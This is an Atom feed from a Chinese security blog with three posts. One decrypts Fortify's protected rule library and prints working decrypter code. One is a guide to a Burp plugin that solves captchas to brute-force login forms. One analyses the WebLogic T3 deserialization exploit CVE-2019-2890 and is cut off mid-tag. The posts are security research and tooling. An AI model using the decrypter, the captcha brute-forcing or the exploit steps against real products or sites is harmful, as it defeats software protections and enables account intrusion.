<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>回忆飘如雪</title>
  
  <subtitle>c0ny1&#39;s Blog-专注漏洞艺术</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://gv7.me/"/>
  <updated>2019-12-23T17:23:35.217Z</updated>
  <id>http://gv7.me/</id>
  
  <author>
    <name>c0ny1</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>fortify规则库解密之旅</title>
    <link href="http://gv7.me/articles/2019/fortify-rule-library-decryption-process/"/>
    <id>http://gv7.me/articles/2019/fortify-rule-library-decryption-process/</id>
    <published>2019-12-22T15:18:28.000Z</published>
    <updated>2019-12-23T17:23:35.217Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间在学习fortify的规则编写，想充分利用其污点回溯功能来扫描出当下比较新的漏洞，比如fastjson反序列化漏洞。网上有比较好的资料是《fortify安全代码规则编写指南》，但是很缺例子。于是想参考下官方的规则库，但是是加密的，万般无奈只能踏上解密之旅。</p><h2 id="0x01-解密思路"><a href="#0x01-解密思路" class="headerlink" title="0x01 解密思路"></a>0x01 解密思路</h2><p>猜测fortify会和AWVS一样，会将规则库加载到内存当中进行解密，然后再使用其进行代码扫描。基于这个想法，它必然存在一个解密方法，而这个方法肯定在某个jar当中。锁定负责解密的jar之后，就可以审计jar的所有方法。然后通过调试来理清解密流程，最后我们就可以写代码来模拟这个过程，来解密规则库。</p><h2 id="0x02-定位解密jar"><a href="#0x02-定位解密jar" class="headerlink" title="0x02 定位解密jar"></a>0x02 定位解密jar</h2><p>通过反编译发现fortify依赖的jar基本都没有混淆，说明我们可以通过<code>jar名</code>和<code>类名</code>来初步锁定加密方法所在jar。类名搜索工具使用的是我在<a href="http://gv7.me/articles/2019/quickly-find-jars-that-depend-on-poc-exp/">《如何快速找到POC/EXP依赖的jar？》</a>一文中开发的<code>SearchClassInJar.jar</code>。在分别尝试<code>encrypt</code>,<code>decrypt</code>,<code>crypto</code>,<code>rule</code>,<code>fortify</code>等关键字后,最终搜索到两个可疑jar。</p><ol><li>fortify-common-17.10.0.0156.jar</li><li>fortify-crypto-1.0.jar</li></ol><p><img src="/articles/2019/fortify-rule-library-decryption-process/F42189E8-11C8-4825-A49B-58FD79640C35.png" alt="搜索解密jar"></p><h2 id="0x03-定位解密方法"><a href="#0x03-定位解密方法" class="headerlink" title="0x03 定位解密方法"></a>0x03 定位解密方法</h2><h4 id="3-1-通过调试定位"><a href="#3-1-通过调试定位" class="headerlink" title="3.1 通过调试定位"></a>3.1 通过调试定位</h4><p>定位解密方法最好的方法就是调试。打开fortify的<code>\Core\private-bin\awb\productlaunch.cmd</code>脚本，在最后一行如下图位置粘贴调试配置，就可以以调试模式启动fortify。然后配置IDEA连接5005端口即可进行调试。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/ECBDE745-99FE-40AC-8C13-D1267B9CA5BB.png" alt="让fortify开启调试模式"></p><p>通过审计这两个jar代码，基本确定<code>fortify-crypto-1.0.jar</code>就是加解密方法所在。通过函数名，参数类型，代码逻辑确定了如下涉及解密的可疑方法，并给它们都打上断点。</p><ol><li>void <code>decrypt</code>(long[] v, long[] k)</li><li>void <code>dec</code>(InputStream source, OutputStream dest, long[] usrKey)</li><li>InputStream <code>decryptCompressedAfterHeaders</code>(InputStream encrypted, String keyString)</li><li>InputStream <code>decryptAfterHeaders</code>(InputStream encrypted, String keyString, boolean compressed)</li><li>InputStream <code>decryptCompressed</code>(InputStream encrypted, String keyString)</li><li>void <code>encryptAfterHeaders</code>(InputStream stream, OutputStream ciphertext, String keyString, boolean compress)</li></ol><p>接着运行fortify扫描一个<code>java web demo</code>，最终漏洞是扫描出来了，但是没有一个可疑方法被调用，甚是奇怪。于是我将所有方法都打上断点，发现扫描期间只有<code>readHeaders(InputStream encrypted)</code>被调用了。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/8128736C-CBCB-4521-9E67-E33D900E0756.png" alt="扫描期间只有readHeaders方法被调用"></p><p>难道fortify并没有在扫描时对规则进行解密，可以直接读取规则内容？后面通过调用栈上下文也没发现解密操作。</p><h4 id="3-2-通过编码调用定位"><a href="#3-2-通过编码调用定位" class="headerlink" title="3.2 通过编码调用定位"></a>3.2 通过编码调用定位</h4><p>这时一个朋友突然叫去包饺子，我才记起今天是冬至。为了速战速决，我决定 通过写代码直接将规则库传入到可疑方法中进行解密，然后看返回的解密结果是否是有意义的明文来判断是否是我们要找的解密方法。 于是将CryptoUtil类中的所有代码审计一遍之后，发现decryptCompressed()可以解密压缩一个文件，感觉看到来希望。​</p><p>下面我们来看看该方法的运行流程。该方法最终会调用decryptAfterHeaders()，它负责控制解密解压整个流程。可以看到如果key没设置会被设置为默认值。接着会调用doBlockCipher()来解密，使用uncompressString来解压。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/0B404A33-CFBB-49CF-BE75-FB2364DEA968.png" alt="解密压缩方法decryptAfterHeaders()"></p><p>我们再来看看<code>doBlockCipher()</code>方法,它可以进行加密和解密。传入的是<code>false</code>所以是解密。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/DC72BDA4-2492-405B-AC9A-3815A386311A.png" alt="doBlockCipher()方法调用dec对文件进行解密"></p><p>而最终文件内容会被传入<code>dec()</code>方法解密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dec</span><span class="params">(InputStream source, OutputStream dest, <span class="keyword">long</span>[] usrKey)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">long</span>[] k = (<span class="keyword">long</span>[])((<span class="keyword">long</span>[])usrKey.clone());</span><br><span class="line">    <span class="keyword">byte</span>[] byteBuf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">byte</span>[] byteBufDelay = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">long</span>[] unsigned32Buf = <span class="keyword">new</span> <span class="keyword">long</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">long</span> top = <span class="number">4294967295L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> bytesRead;</span><br><span class="line">    <span class="keyword">while</span>((bytesRead = source.read(byteBuf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bytesRead &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"invalid encrypted stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        byteArrayToUnsigned32(byteBuf, unsigned32Buf);</span><br><span class="line">        decrypt(unsigned32Buf, k);</span><br><span class="line">        k[<span class="number">0</span>] = k[<span class="number">0</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        k[<span class="number">1</span>] = k[<span class="number">1</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        k[<span class="number">2</span>] = k[<span class="number">2</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        k[<span class="number">3</span>] = k[<span class="number">3</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        unsigned32ToByteArray(unsigned32Buf, byteBuf);</span><br><span class="line">        <span class="keyword">if</span> (source.available() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> bytesToWrite = byteBuf[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">if</span> (bytesToWrite &gt; <span class="number">8</span> || bytesToWrite &lt; <span class="number">0</span> || byteBufDelay == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"invalid encrypted stream"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            dest.write(byteBufDelay, <span class="number">0</span>, bytesToWrite);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (byteBufDelay != <span class="keyword">null</span>) &#123;</span><br><span class="line">            dest.write(byteBufDelay, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">byte</span>[] t = byteBufDelay;</span><br><span class="line">            byteBufDelay = byteBuf;</span><br><span class="line">            byteBuf = t;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            byteBufDelay = byteBuf;</span><br><span class="line">            byteBuf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此我们确定decryptCompressed()可以解密解压一个文件，至于是否可以是规则库文件，我们可以写如下代码来测试。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/117337DD-962F-4B64-90AF-AC4C98D92F47.png" alt="decryptCompressed()方法可以完美解密规则库文件"></p><p>发现解密结果是有意义的xml文件内容，完美解密！</p><h2 id="0x04-编写解密程序"><a href="#0x04-编写解密程序" class="headerlink" title="0x04 编写解密程序"></a>0x04 编写解密程序</h2><p>理清整个过程后，解密就很简单了。说白了就是批量调用fortify自带的<code>fortify-crypto-1.0.jar</code>中的<code>com.fortify.util.CryptoUtil.decryptCompressed()</code>方法进行解密。最后附上解密程序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.fortify.util.CryptoUtil.decryptCompressed;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FortifyRuleDecrypter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String ruleDir;</span><br><span class="line">    <span class="keyword">private</span> String saveDir;</span><br><span class="line"></span><br><span class="line">    FortifyRuleDecrypter(String ruleDir,String saveDir)&#123;</span><br><span class="line">        <span class="keyword">this</span>.ruleDir = ruleDir;</span><br><span class="line">        <span class="keyword">this</span>.saveDir = saveDir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">doDecrypt</span><span class="params">()</span></span>&#123;</span><br><span class="line">        File encryptRule = <span class="keyword">new</span> File(ruleDir);</span><br><span class="line">        <span class="comment">// 传入的是文件</span></span><br><span class="line">        <span class="keyword">if</span>(encryptRule.isFile()) &#123;</span><br><span class="line">            <span class="keyword">if</span>(encryptRule.getName().endsWith(<span class="string">".bin"</span>)) &#123;</span><br><span class="line">                decryptRule(encryptRule, <span class="keyword">new</span> File(saveDir + File.separator + encryptRule.getName() + <span class="string">".xml"</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.println(<span class="string">"[-] The rule file suffix is.bin!"</span>);</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//传入是目录</span></span><br><span class="line">        <span class="keyword">if</span> (encryptRule.isDirectory()) &#123;</span><br><span class="line">            File[] listFile = encryptRule.listFiles();</span><br><span class="line">            <span class="keyword">for</span>(File file:listFile)&#123;</span><br><span class="line">                <span class="keyword">if</span>(file.getName().endsWith(<span class="string">".bin"</span>))&#123;</span><br><span class="line">                    File saveName = <span class="keyword">new</span> File(saveDir + File.separator + file.getName().replace(<span class="string">".bin"</span>,<span class="string">""</span>) + <span class="string">".xml"</span>);</span><br><span class="line">                    decryptRule(file,saveName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">decryptRule</span><span class="params">(File encFile, File decFile)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//调用decryptCompressed()对规则库进行解密</span></span><br><span class="line">            InputStream ruleStream = decryptCompressed(<span class="keyword">new</span> FileInputStream(encFile), <span class="keyword">null</span>);</span><br><span class="line">            OutputStream outputStream = <span class="keyword">new</span> FileOutputStream(decFile);</span><br><span class="line">            <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> ((ruleStream.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                outputStream.write(b);</span><br><span class="line">            &#125;</span><br><span class="line">            ruleStream.close();</span><br><span class="line">            outputStream.close();</span><br><span class="line">            System.out.println(String.format(<span class="string">"[+] success %s -&gt; %s"</span>,encFile.getName(),decFile.getAbsolutePath()));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(String.format(<span class="string">"[-] fail %s -&gt; %s"</span>,encFile.getName(),decFile.getAbsolutePath()));</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args.length != <span class="number">2</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Usage: java -jar FortifyRuleDecrypter.jar [rule_dir|rule_file] &lt;save_dir&gt;"</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        FortifyRuleDecrypter decrypter = <span class="keyword">new</span> FortifyRuleDecrypter(args[<span class="number">0</span>],args[<span class="number">1</span>]);</span><br><span class="line">        decrypter.doDecrypt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/fortify-rule-library-decryption-process/726FEDA7-ABD4-4EED-9431-B87C034A5F5C.png" alt="解密效果"></p><h2 id="0x05-最后的话"><a href="#0x05-最后的话" class="headerlink" title="0x05 最后的话"></a>0x05 最后的话</h2><p>最终为了快速解决问题，通过编码调用锁定解密方法，确实有运气的成分。至此依然存在如下问题，只能等有空再研究。先赶时间去朋友那撸猫包饺子了！</p><ol><li>fortify在扫描时没有调用解密方法，难道是加密的规则库可以直接用于扫描？</li><li>如果扫描无需解密规则库，那为何fortify又要在jar中提供解密方法？</li><li>到底解密方法在哪里被调用？</li></ol><p><img src="/articles/2019/fortify-rule-library-decryption-process/dumplings-and-cat.jpeg" alt="冬至的夜晚"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前段时间在学习fortify的规则编写，想充分利用其污点回溯功能来扫描出当下比较新的漏洞，比如fastjson反序列化漏洞。网上有比较好的资料是《fortify安全代码规则编写指南》，但是很缺例子。于是想参考下官方的规则库，但是是加密的，万般无奈只能踏上解密之旅。&lt;/p&gt;

      
    
    </summary>
    
      <category term="逆向破解" scheme="http://gv7.me/categories/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="fortify" scheme="http://gv7.me/tags/fortify/"/>
    
  </entry>
  
  <entry>
    <title>使用burp插件captcha-killer识别图片验证码</title>
    <link href="http://gv7.me/articles/2019/burp-captcha-killer-usage/"/>
    <id>http://gv7.me/articles/2019/burp-captcha-killer-usage/</id>
    <published>2019-12-16T17:30:18.000Z</published>
    <updated>2019-12-16T18:37:31.053Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-开发背景"><a href="#0x01-开发背景" class="headerlink" title="0x01 开发背景"></a>0x01 开发背景</h2><p>说起对存在验证码的登录表单进行爆破，大部分人都会想到<code>PKav HTTP Fuzzer</code>，这款工具在前些年确实给我们带来了不少便利。反观burp一直没有一个高度自定义通杀大部分图片验证码的识别方案，于是抽了点闲暇的时间开发了<a href="https://github.com/c0ny1/captcha-killer" target="_blank" rel="noopener">captcha-kille</a>，希望burp也能用上各种好用的识别码技术。其设计理念是<code>只专注做好对各种验证码识别技术接口的调用！</code>说具体点就是burp通过同一个插件，就可以适配各种验证码识别接口，无需重复编写调用代码。今天不谈编码层面如何设计，感兴趣的可以去github看源码。此处只通过使用步骤来说明设计的细节。</p><h2 id="0x02-Step1-将获取验证码的数据包发送到插件"><a href="#0x02-Step1-将获取验证码的数据包发送到插件" class="headerlink" title="0x02 Step1:将获取验证码的数据包发送到插件"></a>0x02 Step1:将获取验证码的数据包发送到插件</h2><p>使用burp抓取获取验证码数据包，然后右键<code>captcha-killer</code> -&gt; <code>send to captcha panel</code>发送数据包到插件的验证码请求面板。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step1-1.png" alt="将请求验证码数据包发送到插件"></p><p>然后到切换到插件面板，点击获取即可拿到要识别的验证码图片内容。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step1-2.png" alt="请求获取验证码"></p><p><strong>注意：获取验证码的cookie一定要和intruder发送的cookie相同！</strong></p><h2 id="0x03-Step2-配置识别接口的地址和请求包"><a href="#0x03-Step2-配置识别接口的地址和请求包" class="headerlink" title="0x03 Step2:配置识别接口的地址和请求包"></a>0x03 Step2:配置识别接口的地址和请求包</h2><p>拿到验证码之后，就要设置接口来进行识别了。我们可以使用网上寻找免费的接口，用burp抓包，然后右键发送到插件的接口请求面板。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step2-1.png" alt="将接口调用请求发送到插件"></p><p>然后我们把图片内容的位置用标签来代替。比如该例子使用的接口是post提交image参数，参数的值为图片二进制数据的base64编码后的url编码。那么<code>Request template</code>(请求模版)面板应该填写如下：</p><p><img src="/articles/2019/burp-captcha-killer-usage/step2-2.png" alt="接口请求模版设置"></p><table><thead><tr><th align="center">ID</th><th align="left">标签</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="left"><code>&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;</code></td><td align="left">代表验证码图片原二进制内容</td></tr><tr><td align="center">2</td><td align="left"><code>&lt;@URLENCODE&gt;&lt;/@URLENCODE&gt;</code></td><td align="left">对标签内的内容进行url编码</td></tr><tr><td align="center">3</td><td align="left"><code>&lt;@BASE64&gt;&lt;/@BASE64&gt;</code></td><td align="left">对标签内的内容进行base64编码</td></tr></tbody></table><p>最后点击“识别”即可获取到接口返回的数据包，同时在<code>request raw</code>可以看到调用接口最终发送的请求包。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step2-3.png" alt="模版被渲染为最终的请求"></p><h2 id="0x03-Step3-设置用于匹配识别结果的规则"><a href="#0x03-Step3-设置用于匹配识别结果的规则" class="headerlink" title="0x03 Step3:设置用于匹配识别结果的规则"></a>0x03 Step3:设置用于匹配识别结果的规则</h2><p>通过上一步我们获取到了识别接口的返回结果，但是插件并不知道返回结果中，哪里是真正的识别结果。插件提供了4中方式进行匹配，可以根据具体情况选择合适的。</p><table><thead><tr><th align="center">ID</th><th align="left">规则类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">Repose data</td><td align="left">这种规则用于匹配接口返回包内容直接是识别结果</td></tr><tr><td align="center">2</td><td align="left">Regular expression</td><td align="left">正则表达式,适合比较复杂的匹配。比如接口返回包<code>{&quot;coede&quot;:1,&quot;result&quot;:&quot;abcd&quot;}</code>说明abcd是识别结果，我们可以编写规则为<code>result&quot;:&quot;(.*?)&quot;\}</code></td></tr><tr><td align="center">3</td><td align="left">Define the start and end positions</td><td align="left">定义开始和结束位置,使用上面的例子，可以编写规则<code>{&quot;start&quot;:21,&quot;end&quot;:25}</code></td></tr><tr><td align="center">4</td><td align="left">Defines the start and end strings</td><td align="left">定义开始和结束字符，使用上面的例子，可以编写规则为<code>{&quot;start&quot;:&quot;result\&quot;:\&quot;,&quot;end&quot;:&quot;\&quot;\}&quot;}</code></td></tr></tbody></table><p>通过分析我们知道，接口返回的json数据中，字段<code>words</code>的值为识别结果。我们这里使用<code>Regular expression</code>(正则表达式)来匹配，然后选择<code>yzep</code>右键<code>标记为识别结果</code>，系统会自动生成正则表达式规则<code>&quot; (.*?)&quot;\}\]</code>。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step3-1.png" alt="设置匹配方式和自动生成规则"></p><p>注意：若右键标记自动生成的规则匹配不精确，可以人工进行微调。比如该例子中可以微调规则为<code>&quot;words&quot;\: &quot;(.*?)&quot;\}</code>将更加准确！</p><p>到达这步建议将配置好常用接口的url，数据包已经匹配规则保存为模版，方便下次直接通过右键<code>模板库</code>中快速设置。同时插件也有默认的模版供大家使用与修改。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step3-2.png" alt="保存设置好的配置，方便下次快速配置"></p><h2 id="0x04-Step4-在Intruder模块调用"><a href="#0x04-Step4-在Intruder模块调用" class="headerlink" title="0x04 Step4:在Intruder模块调用"></a>0x04 Step4:在Intruder模块调用</h2><p>配置好各项后，可以点击<code>锁定</code>对当前配置进行锁定，防止被修改导致爆破失败！接着安装以下步骤进行配置</p><p><img src="/articles/2019/burp-captcha-killer-usage/step4-1.png" alt="设置Intruder的爆破模式和payload位置"></p><p><img src="/articles/2019/burp-captcha-killer-usage/step4-2.png" alt="验证码payload选择有插件来生成"></p><p><img src="/articles/2019/burp-captcha-killer-usage/step4-3.png" alt="进行爆破，可以通过对比识别结果看出识别率"></p><h2 id="0x05-使用小案例"><a href="#0x05-使用小案例" class="headerlink" title="0x05 使用小案例"></a>0x05 使用小案例</h2><p>后续将通过小案例来演示，如何通过captcha-killer让burp使用上各种技术识别验证码(免费方案)，敬请期待！</p><ul><li>《captcha-killer调用tesseract-ocr识别验证码》[待发布]</li><li>《captcha-killer调用完美识别验证码系统》[待发布]</li><li>《captcha-killer调用百度ocr识别验证码》[待发布]</li><li>《capatch-killer+机器学习识别验证码》[待发布]</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-开发背景&quot;&gt;&lt;a href=&quot;#0x01-开发背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 开发背景&quot;&gt;&lt;/a&gt;0x01 开发背景&lt;/h2&gt;&lt;p&gt;说起对存在验证码的登录表单进行爆破，大部分人都会想到&lt;code&gt;PKav HTTP 
      
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="burp" scheme="http://gv7.me/tags/burp/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic t3反序列化漏洞(CVE-2019-2890)分析</title>
    <link href="http://gv7.me/articles/2019/cve-2019-2890-vulnerability-analysis/"/>
    <id>http://gv7.me/articles/2019/cve-2019-2890-vulnerability-analysis/</id>
    <published>2019-11-04T14:04:07.000Z</published>
    <updated>2019-11-05T02:13:00.189Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞背景"><a href="#0x01-漏洞背景" class="headerlink" title="0x01 漏洞背景"></a>0x01 漏洞背景</h2><p>在WebLogic官方发布的10月份安全补丁中，包含了由Venustech ADLab提交的CVE-2019-2890的修复。该漏洞通过T3协议发送恶意的反序列化数据绕过了Weblogic的黑名单，成功反序列化执行任意命令。通过官方公告可知，该漏洞的利用条件是需要认证。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/965305D2-2F45-4575-9A16-18A076A01A08.png" alt="官方公告"></p><h2 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h2><ul><li>Weblogic 10.3.6.0.0</li><li>Weblogic 12.1.3.0.0</li><li>Weblogic 12.2.1.3.0</li></ul><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>下面以10.3.6.0作为分析版本。问题出现在<code>PersistentContext</code>类上，通过查看继承关系我们知道<code>PersistentContext</code>类实现了序列化接口<code>Serializable</code>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/E9257EC7-5283-4A10-B5A3-48768E40879D.png" alt="PersistentContext类继承关系"></p><p>我们来看看它的<code>readObject</code>方法，将<code>ObjectInputStream</code>类对象<code>var1</code>传入<code>readSubject</code>方法。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/E970A5E7-E834-400C-9984-5C3507948B64.png" alt="readObject方法"></p><p>跟进<code>readSubject</code>方法发现，会先从<code>var1</code>中读取反序列化数据当中的对象数据。然后调用<code>EncryptionUtil.decrypt</code>方法进行解密，最后解密后的数据被用于反序列化为对象。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/B61188D2-9A6F-4DAC-892B-C1144A88D230.png" alt="readSubject方法"></p><p>至此我们知道<code>PersistenContext</code>序列化数据中还携带了其他对象反序列化后的加密数据。如果我们在序列化<code>PersistentContext</code>时，将恶意对象反序列化数据先加密，然后<code>writeObject</code>，就可以让其携带恶意对象，绕过Weblogic黑名单进行反序列化了。</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>根据以上思路，我们编写一个携带恶意对象的<code>PersistenContext</code>类。只需修改下原来代码中的<code>writeSubject</code>方法为如下，其中<code>Poc.getObject()</code>就是我们的恶意对象。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/5FB1320C-A1C4-43F0-96C5-7D21EE70E199.png" alt="修改writeSubject方法代码"></p><p>在<strong>进行序列化之前我们要处理四个问题</strong>。<strong>第一个问题是创建PersistenContext对象报错</strong>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/57A3655A-F776-49C2-BAA7-0F9F03198140.png" alt="创建PersistenContext对象报错信息"></p><p>这是因为<code>PersistenContext</code>初始化时调用了<code>SecurityServiceManager.isKernelIdentity()</code>进行内核身份判断。<code>isKernelIdentity</code>方法无论如何都会抛出一个<code>NotSupportedException</code>异常，导致我们序列化被终止。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/E816991E-9EA3-468E-85FA-1C9175314834.png" alt="SecurityServiceManager.isKernelIdentity()方法"></p><p>我们可以将其注释掉</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/3E6D0521-8AB3-45E2-B02D-803BBF515919.png" alt="PersistenContext构造方法要修改的代码"></p><p><strong>第二个问题是反序列化PersistenContext类会出现卡死现象</strong>。这是因为<code>PersistenContext</code>等相关的类都会有一个<code>AuthenticatedSubject</code>静态对象要初始化。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/A505C25E-EDF1-412B-8EDE-C7ABE8765F83.png" alt="静态AuthenticatedSubject内核id对象"></p><p>初始化时会进入到如下代码。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/F4F81B39-2D22-4F10-84C2-FF533AB55003.png" alt="导致卡死的代码段"></p><p>我们需要<code>ceClient</code>变量为<code>true</code>，否则会一直进循环执行<code>ceSubjectManagerLock.wait()</code>进行等待，无法序列化！而<code>ceClient</code>是从系统属性<code>com.bea.core.internal.client</code>获取的，所以在序列化之前需要将该属性设置为<code>true</code>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/89C83A3D-8F6F-4C4E-890B-9090929D60F9.png" 